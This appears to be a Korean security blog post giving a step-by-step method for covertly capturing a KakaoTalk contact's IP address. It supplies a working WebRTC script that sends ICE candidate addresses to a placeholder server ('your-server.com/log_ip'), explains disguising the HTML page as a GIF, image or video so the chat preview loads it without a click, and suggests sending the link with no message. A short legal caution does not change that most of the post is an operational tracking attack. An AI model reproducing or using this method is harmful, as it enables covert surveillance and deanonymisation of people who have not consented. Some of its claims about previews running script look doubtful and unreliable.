---
title: "사진 한 장으로 아이피 추적하기3- webrtc"
categories: [security]
tags:
  - 잡다한 연구
---
## **원리**

1. **카카오톡 미리보기 기능을 활용** → 상대방이 메시지를 클릭하지 않아도 미리보기로 콘텐츠를 로드.
2. **WebRTC 코드가 포함된 미디어 파일을 서버에서 제공** → 상대방이 보는 순간 WebRTC 실행.
3. **WebRTC를 이용해 상대방의 IP 주소를 서버로 전송.**

---

## **🚀 실전 방법**

### ✅ **1단계: WebRTC IP 추적 코드 제작**

먼저, 상대방이 이미지를 보는 순간 WebRTC IP 추적이 실행되도록 **HTML 페이지**를 만든다.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        async function getIPs() {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));

            pc.onicecandidate = event => {
                if (event.candidate) {
                    fetch("https://your-server.com/log_ip", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ ip: event.candidate.candidate })
                    });
                }
            };
        }
        getIPs();
    </script>
</head>
<body>
    <img src="your_image.jpg" alt="Loading..." width="1" height="1">
</body>
</html>

```

✅ **설명**

- 상대방이 **이 HTML 페이지를 미리보기로 보게 되면 WebRTC가 실행되어 IP가 추출됨**.
- `fetch("https://your-server.com/log_ip")` 부분에 실제로 IP를 기록할 서버를 넣어야 함.

---

### ✅ **2단계: HTML을 미디어 파일로 위장**

이 HTML을 직접 보낼 수 없으므로, 카카오톡 미리보기에서 자동으로 로드되도록 변형해야 해.

### **🔹 방법 1: GIF 또는 이미지로 위장**

1. **HTML 파일을 이미지처럼 보이도록 변환**
    - `.html`을 `.png`, `.jpg`, `.gif` 등의 확장자로 변경하면 브라우저가 실행할 가능성이 있음.
    - `https://your-server.com/image.gif` URL을 만들고, HTML 대신 GIF처럼 동작하도록 설정.
2. **카카오톡에서 자동 미리보기가 활성화되는지 확인.**

### **🔹 방법 2: 동영상 파일로 위장**

1. `.mp4` 또는 `.mov` 파일을 만들고, 동영상 썸네일을 WebRTC 실행 코드가 포함된 웹 페이지로 연결.
2. 상대방이 채팅방에서 미리보기로 보는 순간 WebRTC 실행.

---

### ✅ **3단계: 카카오톡에서 미리보기가 자동 실행되는지 확인**

카카오톡에서 특정 링크는 미리보기를 자동으로 생성하는데, 이를 활용해야 함.

### **🔍 카카오톡에서 자동 미리보기 생성되는 링크 유형**

| 유형 | 미리보기 자동 실행 가능 여부 |
| --- | --- |
| 일반 HTML | ❌ (클릭 필요) |
| `.png` / `.jpg` (이미지) | ✅ (자동 실행 가능) |
| `.gif` (움직이는 이미지) | ✅ (자동 실행 가능) |
| `.mp4` / `.mov` (동영상) | ✅ (자동 실행 가능) |

💡 **즉, 상대방이 자동으로 미리보기를 보게 하려면 `.gif`, `.mp4`, `.png` 등의 파일로 위장하는 것이 좋음.**

---

## **🔥 실전 시나리오**

1. **서버 설정:**
    - `https://your-server.com/image.gif` 같은 URL에 WebRTC 추적 코드가 포함된 GIF를 업로드.
    - GIF를 미리보는 순간 WebRTC가 실행되도록 설정.
2. **카카오톡에서 전송:**
    
    ```
    
    https://your-server.com/image.gif
    
    ```
    
    - 상대방이 채팅방에서 미리보기로 보면 WebRTC 실행됨.
    
    <aside>
    💡
    
    냅다 아무 말 없이 보내는게 효과적일 것 같음
    
    </aside>
    
3. **IP 수집 확인:**
    - `your-server.com/log_ip`에서 IP 정보를 확인.

---

## **⚠️ 주의할 점**

- **카카오톡에서 미리보기 기능이 업데이트되면 일부 방법이 막힐 수 있음.**
- **상대방이 VPN을 사용하면 실제 IP가 아닌 VPN 서버 IP가 잡힐 가능성이 있음.**
- **법적인 문제를 고려해야 함. 상대방의 동의 없이 정보를 수집하는 것은 법적 책임이 있을 수 있음.**

---

## **💡 결론**

✅ **가장 효과적인 방법**:

- `.gif` 또는 `.mp4` 형식으로 WebRTC 실행 코드를 숨긴 후, 카카오톡에서 자동 미리보기 실행 유도.
- 상대방이 클릭하지 않아도 채팅방에서 **파일을 보는 순간 WebRTC 실행 가능**.